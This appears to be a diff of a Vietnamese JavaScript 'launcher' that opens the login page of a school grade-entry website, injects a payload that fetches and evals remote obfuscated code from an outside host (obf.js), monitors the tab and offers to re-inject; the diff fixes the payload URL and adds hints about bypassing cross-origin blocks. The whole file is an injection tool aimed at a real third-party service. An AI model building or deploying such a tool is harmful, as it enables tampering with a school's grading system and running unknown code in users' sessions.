@@ -1,20 +1,16 @@
 // ============================================================
-// NT4NH2 // LAUNCHER SCRIPT
-// Chức năng: mở URL đích, inject payload, giám sát tool,
-// popup inject lại khi tool bị ngắt.
+// NT4NH2 // LAUNCHER SCRIPT (FIXED CORS & PATH)
 // ============================================================
 
-// ----- CẤU HÌNH MẶC ĐỊNH -----
 const DEFAULT_CONFIG = {
   targetUrl: "https://nhapdiem.truonghocviet.vn/Account/Login",
-  payload: "fetch('vschoolx.vercel.app/files/obf.js').then(r => r.text()).then(eval);",
+  payload: "fetch('https://vschoolx.vercel.app/files/obf.js').then(r => r.text()).then(eval);",
   delay: 3000,
   title: "Launcher Tool",
   bg: "#0d1117",
   text: "#c9d1d9"
 };
 
-// ----- TẢI CẤU HÌNH TỪ LOCALSTORAGE -----
 function loadConfig() {
   const raw = localStorage.getItem("launcher_config");
   if (!raw) return { ...DEFAULT_CONFIG };
@@ -22,21 +18,18 @@ function loadConfig() {
   catch (e) { return { ...DEFAULT_CONFIG }; }
 }
 
-// ----- LƯU CẤU HÌNH -----
 function saveConfig(cfg) {
   localStorage.setItem("launcher_config", JSON.stringify(cfg));
 }
 
 let CONFIG = loadConfig();
 
-// ----- ÁP DỤNG SETTING WEB -----
 function applyWebSettings() {
   document.title = CONFIG.title;
   document.body.style.background = CONFIG.bg;
   document.body.style.color = CONFIG.text;
 }
 
-// ----- THAM CHIẾU DOM -----
 const btnLaunch     = document.getElementById("btnLaunch");
 const btnSettingTool= document.getElementById("btnSettingTool");
 const btnSettingWeb = document.getElementById("btnSettingWeb");
@@ -60,42 +53,41 @@ const inpText       = document.getElementById("inpText");
 const btnSaveWeb    = document.getElementById("btnSaveWeb");
 const btnCloseWeb   = document.getElementById("btnCloseWeb");
 
-// ----- BIẾN GIÁM SÁT TOOL -----
 let toolWindow = null;
 let watchTimer = null;
 let popupShown = false;
 
-// ----- HIỂN THỊ TRẠNG THÁI -----
 function setStatus(msg) {
   statusEl.textContent = "Trạng thái: " + msg;
 }
 
-// ----- MỞ TOOL + INJECT -----
 function launchTool() {
   popupShown = false;
   setStatus("Đang mở URL đích...");
 
+  // Mở tab mới
   toolWindow = window.open(CONFIG.targetUrl, "_blank");
 
   if (!toolWindow) {
-    setStatus("Popup bị chặn. Cho phép popup rồi thử lại.");
+    setStatus("Popup bị chặn. Vui lòng cho phép popup!");
     return;
   }
 
   // Chờ trang tải xong rồi inject
   setTimeout(() => {
     try {
+      // Sử dụng eval trên window của tab mới
       toolWindow.eval(CONFIG.payload);
       setStatus("Đã inject payload. Đang giám sát...");
     } catch (e) {
-      // Nếu bị cross-origin, thử inject qua console-less method
-      setStatus("Inject thất bại (cross-origin). Kiểm tra console.");
+      // Cảnh báo lỗi CORS (thường gặp nếu khác domain)
+      console.error("Lỗi Inject: ", e);
+      setStatus("Lỗi Inject (CORS). Hãy chắc chắn bạn đang chạy tool trên cùng domain hoặc dùng Extension.");
     }
     startWatch();
   }, CONFIG.delay);
 }
 
-// ----- GIÁM SÁT TOOL -----
 function startWatch() {
   stopWatch();
   watchTimer = setInterval(() => {
@@ -110,7 +102,6 @@ function stopWatch() {
   if (watchTimer) { clearInterval(watchTimer); watchTimer = null; }
 }
 
-// ----- KHI TOOL BỊ NGẮT -----
 function onToolClosed() {
   setStatus("Tool đã ngắt.");
   if (!popupShown) {
@@ -119,7 +110,6 @@ function onToolClosed() {
   }
 }
 
-// ----- SỰ KIỆN NÚT -----
 btnLaunch.addEventListener("click", launchTool);
 
 btnSettingTool.addEventListener("click", () => {
@@ -136,7 +126,6 @@ btnSettingWeb.addEventListener("click", () => {
   settingWeb.classList.remove("hidden");
 });
 
-// Lưu setting tool
 btnSaveTool.addEventListener("click", () => {
   CONFIG.targetUrl = inpTargetUrl.value.trim();
   CONFIG.payload   = inpPayload.value.trim();
@@ -146,7 +135,6 @@ btnSaveTool.addEventListener("click", () => {
   setStatus("Đã lưu setting tool.");
 });
 
-// Lưu setting web
 btnSaveWeb.addEventListener("click", () => {
   CONFIG.title = inpTitle.value.trim() || "Launcher Tool";
   CONFIG.bg    = inpBg.value;
@@ -157,11 +145,9 @@ btnSaveWeb.addEventListener("click", () => {
   setStatus("Đã lưu setting web.");
 });
 
-// Đóng modal
 btnCloseTool.addEventListener("click", () => settingTool.classList.add("hidden"));
 btnCloseWeb .addEventListener("click", () => settingWeb.classList.add("hidden"));
 
-// Popup inject lại
 btnReinject.addEventListener("click", () => {
   popup.classList.add("hidden");
   launchTool();
@@ -172,6 +158,5 @@ btnClose.addEventListener("click", () => {
   setStatus("Đã hủy inject lại.");
 });
 
-// ----- KHỞI TẠO -----
 applyWebSettings();
 setStatus("Sẵn sàng.");
